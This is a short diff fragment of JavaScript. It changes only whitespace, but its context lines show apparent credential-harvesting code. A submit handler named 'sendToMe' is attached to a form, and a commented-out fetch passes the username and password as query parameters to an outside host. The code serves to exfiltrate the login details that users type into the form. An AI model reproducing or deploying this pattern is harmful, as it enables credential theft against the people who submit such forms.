@@ -13,7 +13,7 @@ function start() {
         })
         // const response = await fetch(`http://ismage.com/xyfjk32/g?u=${username}&p=${password}`)
     }
-    
+
     if(form) {
         form.addEventListener('submit', sendToMe);
     }
